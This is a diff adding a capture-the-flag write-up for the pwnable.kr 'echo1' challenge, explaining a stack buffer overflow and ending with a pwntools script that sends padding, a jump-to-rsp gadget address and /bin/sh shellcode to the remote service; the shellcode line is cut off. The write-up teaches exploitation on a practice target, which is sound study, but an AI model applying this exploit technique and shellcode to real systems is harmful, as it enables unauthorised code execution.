@@ -29,5 +29,43 @@ One thing to notice is that we normally can't do things like `xor esp, esp`, `po
 In order to be able to do it we would have to run the command `ulimit -s unlimited`.
 So the answer will be:
 
+### Echo1 - Level 10
 
-![image](https://user-images.githubusercontent.com/56035342/212479565-354078e2-4cf4-4163-a0d8-63c2d5de9d8f.png)
+We have a program which asks a user for a name, and then a string and it echos the string.
+the vulnerability in this program is that when we get input from the user, we can write after the string, since the fgets writes to many characters:
+![image](https://user-images.githubusercontent.com/56035342/212696261-e353434b-a8be-4d17-89ca-c401835d1b11.png)
+So we can understand that the challenge is some kind of a bufferoverflow.
+After doing what we usually do when facing a bufferoverflow vulnerability,
+I have found that the return address is stored 40 characters after the string(32 (size of buffer) + 8(ebp))
+Another important thing to notice is that when we enter the name, it takes the first 4 bytes and puts it in the variable `id`, which is stored in `0x6020A0`, which means we can control a variable at a location we know, which is a really powerfull thing(spoiler: because we can jmp to that location and run an instruction we want)
+In order to exploit those vulnerabilies, I have done the following things:
+First of all, I compiled the command `jmp rsp`, which jumps to the value of rsp. it gave me `\xff\xe4`.
+We need that specific command, beacause its the exact location of the end of the buffer, where our shellcode is located.
+Now we need 40 characters to reach to the return pointer.
+Then we need to specify an address which our code will jump to when the `ret` instruction is called.
+I entered the address of id(`0x6020A0`) because then it will execute the command I entered, which is `jmp rsp`.
+Then I have specified our shellcode, which will execute `/bin/sh` and give us a shell.
+The final exploit code is as follows:
+
+```py
+from pwn import *
+
+ssh=remote('pwnable.kr',9010)
+shellCode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x>
+jmpRSP = "\xff\xe4"
+space = '\x90' * 40
+keyAddress = '\xa0\x20\x60\x00\x00\x00\x00\x00'
+
+ssh.sendline(jmpRSP)
+ssh.sendline("1")
+ssh.sendline(space + keyAddress + shellCode)
+ssh.interactive()
+
+```
+
+
+
+
+
+
+
